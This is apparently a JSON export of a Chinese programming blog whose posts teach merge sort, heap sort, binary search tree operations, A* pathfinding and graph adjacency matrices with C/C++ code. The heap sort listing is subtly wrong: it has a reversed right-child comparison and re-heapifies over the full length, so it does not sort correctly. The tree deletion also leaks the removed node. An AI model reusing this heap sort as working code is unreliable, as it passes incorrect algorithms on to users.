printf(\"%d\\t\", array[i]); &#125; printf(\"\\n\"); system(\"pause\");&#125;#endif 归并排序 稳定性 归并排序是一种稳定的排序算法。 排序效率： O(N*logN) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;//将两个有序数列a[first...mid]和a[mid+1...last]合并。void mergeArray(int a[], int first, int mid, int last, int temp[])&#123; int leftStart = first; //左有序序列起点 int leftEnd = mid; //左有序序列终点 int rightStart = mid + 1; //右有序序列起点 int rightEnd = last; //右有序序列终点 int length = 0; //两个有序序列合并之后的有序序列长度 int i = leftStart, j = rightStart; //将两个有序序列中的元素合并到第三个有序序列中(a的左半部分和右半部分合并到temp中) while (i &lt;= leftEnd &amp;&amp; j &lt;= rightEnd) &#123; //按照从小到大的顺序放入到temp中 if (a[i] &lt;= a[j]) &#123; temp[length++] = a[i++]; &#125; else &#123; temp[length++] = a[j++]; &#125; &#125; //如果左半部分还有元素, 直接放到temp中 while (i &lt;= leftEnd) &#123; temp[length++] = a[i++]; &#125; //如果右半部分还有元素, 直接放到temp中 while (j &lt;= rightEnd) &#123; temp[length++] = a[j++]; &#125; //将temp中排好的序列拷贝到a数组中 for (i = 0; i &lt; length; i++) &#123; //只替换已排好序的那一部分 a[leftStart + i] = temp[i]; &#125;&#125;//归并排序void mergeSort(int a[], int first, int last, int temp[])&#123; if (first &lt; last) &#123; //找到数组的中间位置 int mid = (first + last) / 2; //左边有序 mergeSort(a, first, mid, temp); //右边有序 mergeSort(a, mid + 1, last, temp); //再将二个有序数列合并 mergeArray(a, first, mid, last, temp); &#125;&#125;#if 0void main()&#123; int i; //定义整型数组 int array[] = &#123; 12, 5, 33, 6, 10 &#125;; //计算数组长度 int len = sizeof(array) / sizeof(int); //遍历数组 printf(\"待排序数组序列: \"); for (i = 0; i &lt; len; ++i) &#123; printf(\"%d\\t\", array[i]); &#125; printf(\"\\n\"); //创建合适大小的临时数组 int *p = (int*)malloc(sizeof(int) * len); if (p == NULL) &#123; return; &#125; mergeSort(array, 0, len - 1, p); free(p); //遍历 printf(\"归并排序之后的序列: \"); for (i = 0; i &lt; len; ++i) &#123; printf(\"%d\\t\", array[i]); &#125; printf(\"\\n\"); system(\"pause\");&#125;#endif 堆排序 将一个数组变成完全二插树 将完全二插树变成大顶堆(每一个父节点数必须大于左右结点数)或小顶堆 最后一个非叶子结点的位置: 数组长度 / 2 - 1 将第一个结点和最后一个结点交换 再次进行一次大顶堆初始化 将第一个结点和倒数第二个结点交换 再次进行大顶堆初始化 将第一个结点和倒数第三个结点交换 然后进行大顶堆优化 将第一个和倒数第四个交换 再次进行大顶堆优化 将第一个和倒数第五个交换 再次进行大顶堆优化 将第一个和倒数第六个交换 进行大顶堆优化 将第一个和倒数第七个交换 进行大顶堆优化 将第一个和倒数第八个交换 因为倒数第八个已经是可以交换的最后一个了,所以不需要大顶堆优化了,这是我们的序列已经排好序了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include&lt;iostream&gt;#include&lt;ctime&gt;using namespace std;#define MAX 10void PrintArr(int arr[], int len) &#123; for (int i = 0; i &lt; len; i++) &#123; cout &lt;&lt; arr[i] &lt;&lt; \" \"; &#125; cout &lt;&lt; endl;&#125;void Swap(int arr[],int index,int max) &#123; int temp = arr[index]; arr[index] = arr[max]; arr[max] = temp;&#125;void HeapAdjust(int arr[],int index,int len) &#123; int lchild = index * 2 + 1; int rchild = index * 2 + 2; int max = index; if (lchild &lt; len &amp;&amp; arr[lchild] &gt; arr[max]) &#123; max = lchild; &#125; if (rchild &lt; len &amp;&amp; arr[rchild] &lt; arr[max]) &#123; max = rchild; &#125; if (max != index) &#123; Swap(arr,index,max); HeapAdjust(arr,max,len); &#125;&#125;void HeapSort(int arr[],int len) &#123; for (int i = len / 2 - 1; i &gt;= 0; i--) &#123; HeapAdjust(arr,i,len); &#125; for (int i = len - 1; i &gt;= 0; i--) &#123; Swap(arr,0,i); HeapAdjust(arr, 0, len); &#125;&#125;int arr[MAX];int main() &#123; int len = sizeof(arr) / sizeof(int); srand((unsigned int)time(NULL)); for (int i = 0; i &lt; MAX; i++) &#123; arr[i] = rand() % 10; &#125; unsigned int start = time(NULL); HeapSort(arr,len); PrintArr(arr,len); unsigned int end = time(NULL); cout &lt;&lt; \"time: \" &lt;&lt; end - start &lt;&lt; endl; return 0;&#125; 排序总结","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"二叉树插入查找删除实现","slug":"二叉树插入查找删除实现","date":"2022-04-21T05:27:04.000Z","updated":"2022-05-06T10:43:06.627Z","comments":true,"path":"2022/04/21/二叉树插入查找删除实现/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/04/21/二叉树插入查找删除实现/","excerpt":"","text":"2.1.3.2 插入算法 ​ 插入新节点的过程 ​ 若二叉排序树T为空，则为待插入的关键字key申请一个新结点，并令其为根； ​ 若二叉排序树T不为空，则将key和根的关键字比较： ​ 若二者相等，则说明树中已有此关键字key，无须插入。 ​ 若key&lt;T→key，则将key插入根的左子树中。 ​ 若key&gt;T→key，则将它插入根的右子树中。 子树中的插入过程与上述的树中插入过程相同。如此进行下去，直到将key作为一个新的叶结点的关键字插入到二叉排序树中，或者直到发现树中已有此关键字为止。 2.1.3.3 查找算法 ​ 查找步骤 若二叉树T为空树,则搜索失败,否则: 若查找的数x等于T根节点的数据域的值,则查找成功,否则: 若查找的数x小于T根节点的数据域的值,则搜索左子树,否则: 查找右子树 2.1.3.4 删除算法 ​ 删除步骤（分三种情况） 若p结点为叶子结点，即该节点左子树PL和右子树PR均为空树。由于删去叶子结点不破坏整棵树的结构，则只需修改其双亲结点的指针即可。 若p结点只有左子树PL或右子树PR，此时只要令PL或PR直接成为其双亲结点f的左子树（当p是左子树）或右子树（当p是右子树）即可，作此修改也不破坏二叉排序树的特性。 若p结点的左子树和右子树均不空。在删去p之后，为保持其它元素之间的相对位置不变，可按中序遍历保持有序进行调整。比较好的做法是，找到p的直接前驱（或直接后继）s，用s来替换结点p，然后再删除结点s。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207#include&lt;iostream&gt;using namespace std;typedef struct TREENODE &#123; int key; TREENODE * leftChild; TREENODE * rightChild; TREENODE * father;&#125;TreeNode,*PTreeNode;//插入void InsertTreeNode(PTreeNode * root,int key) &#123; PTreeNode p = new TreeNode; memset(p,0x00,sizeof TreeNode); p-&gt;key = key; if ((*root) == NULL) &#123; *root = p; return; &#125; if (key &lt; (*root)-&gt;key &amp;&amp; (*root)-&gt;leftChild == NULL) &#123; (*root)-&gt;leftChild = p; return; &#125; if (key &gt; (*root)-&gt;key &amp;&amp; (*root)-&gt;rightChild == NULL) &#123; (*root)-&gt;rightChild = p; return; &#125; delete p; if (key &lt; (*root)-&gt;key) &#123; InsertTreeNode(&amp;(*root)-&gt;leftChild,key); &#125; else if (key &gt; (*root)-&gt;key) &#123; InsertTreeNode(&amp;(*root)-&gt;rightChild, key); &#125; else &#123; cout &lt;&lt; \"key 是树中的一员\" &lt;&lt; endl; &#125;&#125;//创建树void CreateTree(PTreeNode * root, int buf[],int len) &#123; for (int i = 0; i &lt; len; i++) &#123; InsertTreeNode(root,buf[i]); &#125;&#125;void PrintTree(PTreeNode root) &#123; if (root == NULL) &#123; return; &#125; PrintTree(root-&gt;leftChild); cout &lt;&lt; root-&gt;key &lt;&lt; \" \"; PrintTree(root-&gt;rightChild);&#125;//删除bool DeleteTreeNode(PTreeNode * root ,int key) &#123; if ((*root) == NULL) &#123; return false; &#125; if ((*root)-&gt;key == key) &#123; if ((*root)-&gt;rightChild == NULL) &#123; PTreeNode p = (*root); (*root) = (*root)-&gt;leftChild; delete p; return true; &#125; else if ((*root)-&gt;leftChild == NULL) &#123; PTreeNode p = (*root); (*root) = (*root)-&gt;rightChild; delete p; return true; &#125; else &#123; PTreeNode q = (*root); PTreeNode s = (*root)-&gt;leftChild; while (s-&gt;rightChild) &#123; q = s; s = s-&gt;rightChild; &#125; (*root)-&gt;key = s-&gt;key; if ((*root) != q) &#123; q-&gt;rightChild = s-&gt;leftChild; &#125; else &#123; q-&gt;leftChild = s-&gt;leftChild; &#125; return true; &#125; &#125; if (key &lt; (*root)-&gt;key) &#123; DeleteTreeNode(&amp;(*root)-&gt;leftChild, key); &#125; else if (key &gt; (*root)-&gt;key) &#123; DeleteTreeNode(&amp;(*root)-&gt;rightChild, key); &#125; return false;&#125;//查找PTreeNode SearchTree(PTreeNode root, int key)&#123; if (root == NULL) &#123; return NULL; &#125; if (key &lt; root-&gt;key) &#123; return SearchTree(root-&gt;leftChild, key); &#125; if (key &gt; root-&gt;key) &#123; return SearchTree(root-&gt;rightChild, key); &#125; else &#123; return root; &#125;&#125;//查找最大值PTreeNode SearchMaxTree(PTreeNode root) &#123; if (root == NULL) &#123; return NULL; &#125; if (root-&gt;rightChild == NULL) &#123; return root; &#125; return SearchMaxTree(root-&gt;rightChild);&#125;//查找最小值PTreeNode SearchMinTree(PTreeNode root) &#123; if (root == NULL) &#123; return NULL; &#125; if (root-&gt;leftChild == NULL) &#123; return root; &#125; return SearchMinTree(root-&gt;leftChild);&#125;void test01() &#123; int buff[] = &#123; -2,1,4,5,9,2,55,33,44 &#125;; int len = sizeof(buff) / sizeof(int); PTreeNode root = NULL; CreateTree(&amp;root, buff, len); PrintTree(root); InsertTreeNode(&amp;root,-20); cout &lt;&lt; endl; PrintTree(root); InsertTreeNode(&amp;root, -10); cout &lt;&lt; endl; PrintTree(root); InsertTreeNode(&amp;root, -8); cout &lt;&lt; endl; PrintTree(root); DeleteTreeNode(&amp;root, -10); DeleteTreeNode(&amp;root, -8); DeleteTreeNode(&amp;root, -20); DeleteTreeNode(&amp;root, 55); DeleteTreeNode(&amp;root, -2); cout &lt;&lt; endl; PrintTree(root); cout &lt;&lt; endl &lt;&lt; SearchTree(root, 33)-&gt;key &lt;&lt; endl; cout &lt;&lt; SearchMinTree(root)-&gt;key &lt;&lt; endl; cout &lt;&lt; SearchMaxTree(root)-&gt;key &lt;&lt; endl;&#125;int main()&#123; test01(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"AStar寻路算法","slug":"AStar寻路算法","date":"2022-04-17T21:12:11.000Z","updated":"2022-04-17T21:38:32.183Z","comments":true,"path":"2022/04/18/AStar寻路算法/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/04/18/AStar寻路算法/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282#include&lt;iostream&gt;#include&lt;vector&gt;#define ROWS 50 // 行#define COLS 60 // 列#define ZXDJ 10 // 直线代价#define XXDJ 14 // 斜线代价using namespace std;// 保存树节点的个数int deepNum = 0;// 节点结构struct MyPoint &#123; int y; // y坐标 int x; // x坐标 int g; // 从起点到当前点的代价 int h; // 从当前点到终点的代价 int w; // 权值 int f; // 总代价 // 获取F值 void SetF() &#123; f = g + h + w; &#125;&#125;;// 树节点struct TreeNode &#123; MyPoint pos; // 位置 vector&lt;TreeNode *&gt; child; // 子结点 TreeNode * Parent; // 父节点&#125;;// 代表方向enum FANXIAN&#123; p_up, p_down, p_left, p_right, p_upleft,p_upright, p_downleft, p_downright&#125;;// 地图unsigned char map[ROWS][COLS] = &#123; &#123;0,0,0,0,0,1,0,0,0,0&#125;, &#123;0,0,0,0,0,1,0,0,0,0&#125;, &#123;0,0,0,0,0,1,0,0,0,0&#125;, &#123;0,0,0,0,0,1,0,0,0,0&#125;, &#123;0,0,0,0,0,1,0,0,0,0&#125;, &#123;0,0,0,0,0,1,0,0,0,0&#125;, &#123;0,0,0,0,0,1,0,0,0,0&#125;, &#123;0,0,0,0,0,0,0,0,0,0&#125;, &#123;0,0,0,0,0,1,0,0,0,0&#125;, &#123;0,0,0,0,0,1,0,0,0,0&#125;,&#125;;// 标记地图,如果是false代表没有访问过,如果是true代表访问过bool isMap[ROWS][COLS] = &#123; false &#125;;// 打印地图void PrintMap(unsigned char m_map[ROWS][COLS]) &#123; for (int i = 0; i &lt; ROWS; i++) &#123; for (int j = 0; j &lt; COLS; j++) &#123; switch (m_map[i][j]) &#123; case 0: cout &lt;&lt; \"- \"; break; case 1: cout &lt;&lt; \"| \"; break; case 255: cout &lt;&lt; \"* \"; default: break; &#125; &#125; cout &lt;&lt; endl; &#125;&#125;// 获取H值int GetHValue(MyPoint cur,MyPoint endPoint) &#123; int x = ((endPoint.x &gt; cur.x) ? endPoint.x - cur.x : cur.x - endPoint.x); int y = ((endPoint.y &gt; cur.y) ? endPoint.y - cur.y : cur.y - endPoint.y); return (x + y) * ZXDJ;&#125;// 判断是否满足入树条件bool IsNeedAdd(MyPoint cur,unsigned char m_map[ROWS][COLS],bool m_isMap[ROWS][COLS] ) &#123; // 判断位置是否在地图中 if (cur.x &lt; 0 || cur.x &gt;= COLS || cur.y &lt; 0 || cur.y &gt;= ROWS ) &#123; return false; &#125; // 判断当前位置是不是障碍点 if (m_map[cur.y][cur.x] == 1) &#123; return false; &#125; // 判断当前点有没有被访问过 if (m_isMap[cur.y][cur.x]) &#123; return false; &#125; return true;&#125;// 获取存放最小F值的结点容器指针vector&lt;TreeNode *&gt;::iterator GetMinFValue(vector&lt;TreeNode *&gt; &amp; buff) &#123; vector&lt;TreeNode*&gt;::iterator it = buff.begin(); vector&lt;TreeNode*&gt;::iterator min = it; for (;it != buff.end();it++) &#123; if ((*min)-&gt;pos.f &gt; (*it) -&gt;pos.f) &#123; min = it; &#125; &#125; return min;&#125;// 根节点TreeNode * pRoot;// 删除树void DeleteTree(TreeNode * root) &#123; if (root == NULL) &#123; return; &#125; for (int i = 0; i &lt; root-&gt;child.size(); i++) &#123; DeleteTree(root-&gt;child[i]); &#125; root-&gt;child.clear(); vector&lt;TreeNode*&gt;(root-&gt;child).swap(root-&gt;child); delete root; deepNum--; &#125;int main() &#123; // 存放发散的结点 vector&lt;TreeNode*&gt;buff; // 存放当前结点 TreeNode * curTreeNode = new TreeNode; memset(curTreeNode,0x00,sizeof TreeNode); deepNum++; pRoot = curTreeNode; TreeNode * newTreeNode; MyPoint beginPoint = &#123; 0,0 &#125;; // 起点 MyPoint endPoint = &#123; ROWS - 2,COLS-9 &#125;; // 终点 // 设置当前点位置是起点位置 curTreeNode-&gt;pos.x = beginPoint.x; curTreeNode-&gt;pos.y = beginPoint.y; // 存放是否找到终点,true代表找到 bool isFindEnd= false; // 将起点设置为已经访问过 isMap[beginPoint.y][beginPoint.x] = true; while (true) &#123; //从当前点开始发散 for (int i = 0; i &lt; 8; i++) &#123; // 创建一个新结点用来存放发散出来的点 newTreeNode = new TreeNode; // 使新结点的位置等于当前结点的位置 newTreeNode-&gt;pos = curTreeNode-&gt;pos; switch (i) &#123; // 上 case p_up: newTreeNode-&gt;pos.y--; newTreeNode-&gt;pos.g = ZXDJ; // g值是直线代价 break; // 下 case p_down: newTreeNode-&gt;pos.y++; newTreeNode-&gt;pos.g = ZXDJ; break; // 左 case p_left: newTreeNode-&gt;pos.x--; newTreeNode-&gt;pos.g = ZXDJ; break; // 右 case p_right: newTreeNode-&gt;pos.x++; newTreeNode-&gt;pos.g = ZXDJ; break; // 左上 case p_upleft: newTreeNode-&gt;pos.x--; newTreeNode-&gt;pos.y--; newTreeNode-&gt;pos.g = XXDJ; //g值是斜线代价 break; // 右上 case p_upright: newTreeNode-&gt;pos.x++; newTreeNode-&gt;pos.y--; newTreeNode-&gt;pos.g = XXDJ; break; // 左下 case p_downleft: newTreeNode-&gt;pos.x--; newTreeNode-&gt;pos.y++; newTreeNode-&gt;pos.g = XXDJ; break; // 右下 case p_downright: newTreeNode-&gt;pos.x++; newTreeNode-&gt;pos.y++; newTreeNode-&gt;pos.g = XXDJ; break; default: break; &#125; // 计算 新结点的h值 newTreeNode-&gt;pos.h = GetHValue(newTreeNode-&gt;pos,endPoint); // 计算新结点的f值 newTreeNode-&gt;pos.SetF(); // 判断新结点是否满足入树的条件 if (IsNeedAdd(newTreeNode-&gt;pos,map,isMap)) &#123; // 将新结点添加到当前点的子结点中 curTreeNode-&gt;child.push_back(newTreeNode); // 使新结点中的父节点指针成员指向当前结点 newTreeNode-&gt;Parent = curTreeNode; // 添加到buff数组中 buff.push_back(newTreeNode); // 标记新结点已经被访问过 isMap[newTreeNode-&gt;pos.y][newTreeNode-&gt;pos.x] = true; deepNum++; &#125; else &#123; // 不满足入树条件则删除新结点 delete newTreeNode; &#125; &#125; // 判断buff数组是否为空,如果为空则退出循环 if (buff.empty()) &#123; break; &#125; // 获取最小F值的容器位置 vector&lt;TreeNode*&gt;::iterator it = GetMinFValue(buff); // 使当前点指向最小F值的结点 curTreeNode = *it; // 删除buff中最小F值的结点 buff.erase(it); // 判断是否找到终点 if (curTreeNode-&gt;pos.x == endPoint.x &amp;&amp; curTreeNode-&gt;pos.y == endPoint.y) &#123; isFindEnd = true; break; &#125; &#125; // 判断是否找到终点 if (isFindEnd) &#123; cout &lt;&lt; \"找到了\" &lt;&lt; endl; &#125; // 设置起点到终点的路径路线 while (curTreeNode) &#123; map[curTreeNode-&gt;pos.y][curTreeNode-&gt;pos.x] = 255; curTreeNode = curTreeNode-&gt;Parent; &#125; // 打印地图 PrintMap(map); cin.get(); // 删除树 DeleteTree(pRoot); cin.get(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"图(graph)","slug":"图-graph","date":"2022-04-07T18:03:59.000Z","updated":"2022-04-15T23:35:12.676Z","comments":true,"path":"2022/04/08/图-graph/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/04/08/图-graph/","excerpt":"","text":"图的相关概念 图的定义和术语 图的定义：图是由顶点的有穷非空集合和顶点之间的边的集合组成，通常表示为：G = (V,E)，其中，G表示一个图，V是图G中顶点的集合，E是图G中边的集合。 图中的元素称为顶点(Vertex) 顶点必须是有穷的非空集合,因此一个图至少有一个顶点。 顶点之间的逻辑关系用边(Edge)来表示,边集可以是空的。 无向边：若顶点Vi 到Vj 的边没有方向，则称这条边为无向边，用无序偶对（Vi ，Vj）来表示。 有向边：若从顶点Vi 到Vj的边有方向，则称这条边为有向边，也称为弧(Arc)。用有序偶对&lt;Vi ，Vj&gt;来表示。Vi称为弧尾(Tail)或初始点，Vj称为弧头(Head)或终端点。 注意: &lt; Vi ，Vj &gt;和&lt; Vj ，Vi &gt;是两条不同的有向边。 无向图: 如果图中任意两个顶点之间的边都是无向边，则称该图为无向图。 图例(G1): 有向图: 如果图中任意顶点之间的边都是有向边，则称该图为有向图。 图例(G2): 无向完全图：在无向图中，如果任意两个顶点之间都存在边，则称该图为无向完全图。含有n个顶点的无向完全图有n(n-1)/2条边。 图例(G3) 有向完全图：在有向图中，如果任意两个顶点之间都存在方向互为相反的两条弧，则称该图为有向完全图。含有n个顶点的有向完全图有n(n-1)条边。 总结: 图G的顶点数n和边数e的关系 （1）若G是无向图，则0≤e≤n(n-1)/2 恰有n(n-1)/2条边的无向图称无向完全图(Undireet-ed Complete Graph) （2）若G是有向图，则0≤e≤n(n-1)。 恰有n(n-1)条边的有向图称为有向完全图(Directed Complete Graph)。 注意： 完全图具有最多的边数。任意一对顶点间均有边相连。 稀疏图: 有很少条边或弧的图。 稠密图: 有很多条边或弧的图。 权: 有时图的边或弧具有与它相关的数,这种与图的边或弧相关的数叫做权。 网：带权的图通常称为网。 度：顶点的度是指和该顶点关联的边的数目。 无向图的度：与这个顶点相关联的边的条数，边的数量等于各个顶点度数和的一半。 有向图的度： 入度：有向图中以顶点（v）为头的弧的数目，称为（v）的入度。 出度：有向图中以顶点（v）为尾的弧的数目，称为（v）的出度。 弧的数量=各个顶点出度和 = 各个顶点的入度和 邻接点：对于无向图，同一边上的两个顶点称为邻接点。 子图: 假设两个图G=(V,E)和G1=(V1,E1),如果V1⊆V且E1⊆E则G1为G的子图 路径的长度: 路径上的边或弧的数目。 上图中左侧B到D的路径长为2，右侧B到D的路径为3 连通图相关术语 在无向图G=(V,E)中，如果从顶点v到顶点w有路径，则称v和w是相通的。**如果对图中任意两个顶点Vi和Vj 属于E，则两个顶点是连通的，则称G是连通图。**如下图1，它的顶点A都顶点B、C、D都是连通的，但显然顶点A与顶点E或F就无路径，因此不能算是连通图。而图2，顶点A、B、C、D相互都是连通的，所以它本身是连通图。 连通图生成树 连通图的生成树是一个极小的连通子图，它含有图中全部的n个顶点，但只有足以构成一棵树的n-1条边。 极小连通子图是相对于连通图来说的。 比如下图的图1是一个普通图，但显然它不是生成树，当去掉两条构成环的边后，比如图2或图3，就满足n个顶点n-1条边且连通的定义了。它们都是一棵生成树。从这里也知道，如果一个图有n个顶点和小于n-1条边，则是非连通图，如果它多于n-1条边，必定构成一个环，因为这条边使得它依附的那两个顶点之间有了第二条路径。比如图2和图3，随便加哪两顶点的边都将构成环。不过有n-1条边并不一定是生成树，比如图4。 总结 图按照有无方向分为无向图和有向图。 无向图由顶点和边构成。 有向图由顶点和弧构成，弧有弧头和弧尾之分。 图按照边或弧的多少分为稀疏图和稠密图。 如果任意两个顶点之间都存在边叫完全图，有向的叫有向完全图。 与顶点相关联的边的条数叫做度，有向图顶点分为入度和出度。 图上的边或弧带权则称为网。 无向图中连通且n个顶点n-1条边叫生成树。 1.2、图的存储结构 图可以用顺序存储或链式存储 顺序存储:邻接矩阵 链式存储:邻接表 1.2.1邻接矩阵 图的邻接矩阵存储方式是用两个数组来表示图。 一个一维数组存储图中顶点信息。 一个二维数组（邻接矩阵）存储图中的边或弧的信息。 设图G有n个顶点，则邻接矩阵是一个n*n的方阵，定义为： 看一个实例，下图左就是一个无向图。 从上面可以看出，无向图的边数组是一个对称矩阵。所谓对称矩阵就是n阶矩阵的元满足aij = aji ，即从矩阵的左上角到右下角的主对角线为轴，右上角的元和左下角相对应的元全都是相等的。 从这个矩阵中，很容易知道图中的信息。 （1）判断任意两顶点是否有边无边； （2）某个顶点的度，其实就是这个顶点vi在邻接矩阵中第i行或（第i列）的元素之和； （3）**求顶点vi的所有邻接点就是将矩阵中第i行元素扫描一遍，**arc[i][j]为1就是邻接点； 而有向图讲究入度和出度，顶点v2的入度为2，正好是第i列各数之和。顶点v2的出度为1，即第i行的各数之和。 若图G是网图，有n个顶点，则邻接矩阵是一个n*n的方阵，定义为： 这里的wij表示(vi,vj)上的权值。无穷大表示一个计算机允许的、大于所有边上权值的值，也就是一个不可能的极限值。下面左图就是一个有向网图，下图就是它的邻接矩阵。 创建无向图和有向图代码示例 无向图 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;//最大的顶点数#define MaxVertex 50 //存放顶点名称的数组typedef char VertexInfo[9];// 定义图的结构struct Graph&#123; // 顶点数组 - 存储顶点的名字 等价于 vertex[MaxVertex][9] 最多存放MaxVertex个顶点 VertexInfo vertex[MaxVertex]; // 边的数组 二维矩阵 int edge[MaxVertex][MaxVertex]; // 顶点的个数 int vertexNum; // 边的条数 int edgeNum;&#125;;// 求用户输入的顶点在顶点数组中的位置int LocalVertex(Graph &amp;g, VertexInfo v)&#123; // 遍历顶点数组 for (int i = 0; i &lt; g.vertexNum; ++i) &#123; if (strcmp(v, g.vertex[i]) == 0) &#123; // 找到了,返回元素的下标 return i; &#125; &#125; // 没找到 return -1;&#125;// 构建一个图void CreateGraph(Graph &amp;g)&#123; cout &lt;&lt; \"请输入图的顶点数和边数: 顶点 边\" &lt;&lt; endl; cin &gt;&gt; g.vertexNum &gt;&gt; g.edgeNum; cout &lt;&lt; \"请输入\" &lt;&lt; g.vertexNum &lt;&lt; \"个顶点的值\" &lt;&lt; endl; for (int i = 0; i &lt; g.vertexNum; ++i) &#123; cin &gt;&gt; g.vertex[i]; //初始化每个顶点 &#125; // 初始化所有边都不存在 for (int i = 0; i &lt; g.vertexNum; ++i) &#123; for (int j = 0; j &lt; g.vertexNum; ++j) &#123; g.edge[i][j] = 0; &#125; &#125; cout &lt;&lt; \"请输入\" &lt;&lt; g.edgeNum &lt;&lt; \"条边, 顶点1 顶点2\" &lt;&lt; endl; VertexInfo v1, v2; for (int i = 0; i &lt; g.edgeNum; ++i) &#123; cin &gt;&gt; v1 &gt;&gt; v2; // 求用户输入的顶点在顶点数组中的位置 int m = LocalVertex(g, v1); //获取v1在二维数组中的位置 int n = LocalVertex(g, v2); //获取v2在二维数组中的位置 // 边对应的二维数组赋值 g.edge[m][n] = 1; g.edge[n][m] = 1; // 无向图 对称关系 &#125;&#125;// 打印图 - void PrintGraph(Graph&amp; g)&#123; // 水平表头 cout &lt;&lt; \"\\t\"; for (int i = 0; i &lt; g.vertexNum; ++i) &#123; cout &lt;&lt; g.vertex[i] &lt;&lt; \"\\t\"; &#125; for (int i = 0; i &lt; g.vertexNum; ++i) &#123; cout &lt;&lt; endl; // 垂直的 cout &lt;&lt; g.vertex[i] &lt;&lt; \"\\t\"; for (int j = 0; j &lt; g.vertexNum; ++j) &#123; cout &lt;&lt; g.edge[i][j] &lt;&lt; \"\\t\"; &#125; &#125; cout &lt;&lt; endl;&#125;//构建图void test01()&#123; Graph graph; CreateGraph(graph); PrintGraph(graph);&#125;int main()&#123; test01(); system(\"pause\"); return EXIT_SUCCESS;&#125; 有向图 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;#define MaxVertex 50typedef char VertexInfo[9];// 定义图的结构struct Graph&#123; // 顶点数组 - 存储顶点的名字 VertexInfo vertex[MaxVertex]; // 边的数组 int edge[MaxVertex][MaxVertex]; // 顶点的个数 int vertexNum; // 边的条数 int edgeNum;&#125;;// 求用户输入的顶点在顶点数组中的位置int LocalVertex(Graph &amp;g, VertexInfo v)&#123; // 遍历顶点数组 for (int i = 0; i &lt; g.vertexNum; ++i) &#123; if (strcmp(v, g.vertex[i]) == 0) &#123; // 找到了,返回元素的下标 return i; &#125; &#125; // 没找到 return -1;&#125;// 构建一个图void CreateGraph(Graph &amp;g)&#123; cout &lt;&lt; \"请输入图的顶点数和边数: 顶点 边\" &lt;&lt; endl; cin &gt;&gt; g.vertexNum &gt;&gt; g.edgeNum; cout &lt;&lt; \"请输入\" &lt;&lt; g.vertexNum &lt;&lt; \"个顶点的值\" &lt;&lt; endl; for (int i = 0; i &lt; g.vertexNum; ++i) &#123; cin &gt;&gt; g.vertex[i]; &#125; // 初始化所有边都不存在 for (int i = 0; i &lt; g.vertexNum; ++i) &#123; for (int j = 0; j &lt; g.vertexNum; ++j) &#123; g.edge[i][j] = INT_MAX; &#125; &#125; // &lt;B, A&gt; cout &lt;&lt; \"请输入\" &lt;&lt; g.edgeNum &lt;&lt; \"条边, 弧尾 弧头 权重\" &lt;&lt; endl; int w; VertexInfo v1, v2; for (int i = 0; i &lt; g.edgeNum; ++i) &#123; cin &gt;&gt; v1 &gt;&gt; v2 &gt;&gt; w; // 求用户输入的顶点在顶点数组中的位置 int m = LocalVertex(g, v1); int n = LocalVertex(g, v2); // 边对应的二维数组赋值 g.edge[m][n] = w; &#125;&#125;// 打印图 - void PrintGraph(Graph&amp; g)&#123; // 水平表头 cout &lt;&lt; \"\\t\"; for (int i = 0; i &lt; g.vertexNum; ++i) &#123; cout &lt;&lt; g.vertex[i] &lt;&lt; \"\\t\"; &#125; for (int i = 0; i &lt; g.vertexNum; ++i) &#123; cout &lt;&lt; endl; // 垂直的 cout &lt;&lt; g.vertex[i] &lt;&lt; \"\\t\"; for (int j = 0; j &lt; g.vertexNum; ++j) &#123; if (g.edge[i][j] == INT_MAX) &#123; cout &lt;&lt; \"∞\" &lt;&lt; \"\\t\"; &#125; else &#123; cout &lt;&lt; g.edge[i][j] &lt;&lt; \"\\t\"; &#125; &#125; &#125; cout &lt;&lt; endl;&#125;void test01()&#123; Graph g; CreateGraph(g); PrintGraph(g);&#125;int main()&#123; test01(); system(\"pause\"); return EXIT_SUCCESS;&#125; 邻接表 邻接矩阵是不错的一种图存储结构，但是，对于边数相对顶点较少的图，这种结构存在对存储空间的极大浪费。因此，找到一种数组与链表相结合的存储方法称为邻接表。 邻接表的存储方式是这样的： （1）图中顶点用一个一维数组存储，当然，顶点也可以用单链表来存储， 不过，数组可以较容易的读取顶点的信息，更加方便。 （2）图中每个顶点vi的所有邻接点构成一个线性表，由于邻接点的个数不定，所以，用单链表存储，无向图称为顶点vi的边表，有向图则称为顶点vi作为弧尾的出边表。 数据结构定义: 例如，下图就是一个无向图的邻接表的结构。 